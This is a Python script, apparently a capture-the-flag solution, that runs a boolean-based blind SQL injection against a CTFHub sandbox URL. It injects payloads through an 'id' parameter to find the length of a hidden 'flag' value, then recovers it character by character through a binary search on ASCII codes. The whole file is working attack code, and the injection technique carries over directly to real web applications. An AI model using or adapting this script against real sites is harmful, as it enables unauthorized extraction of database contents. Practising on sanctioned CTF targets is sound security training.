import requests
url = "http://challenge-760380918e489295.sandbox.ctfhub.com:10800/"
query = "select column_name from information_schema.columns where table_name = 'flag' limit 0,1"

value_query = "select flag from flag"
def is_true(payload):
    r = requests.get(url,params={"id":payload},timeout=5)
    return "query_success" in r.text

def len_column_name():
    for length in range(1,100):
        if is_true(f"1 and length(({value_query})) = {length}"):
            print(f"列的长度为：{length}")
            break

def ser_column_name():
    column_name = ""
    for pos in range(1,33):
        lo,hi = 32,126
        while lo<hi:
            mid = (lo+hi+1)//2
            if(is_true(f"1 and ascii(substr(({value_query}),{pos},1)) >= {mid}")):
                lo = mid
            else:
                hi = mid-1
        column_name+=chr(lo)
        print(f"第{pos}位：{chr(lo)}->当前结果：{column_name}")

#len_column_name()
ser_column_name()
        
"""
tables:
1.4 flag
2.4
"""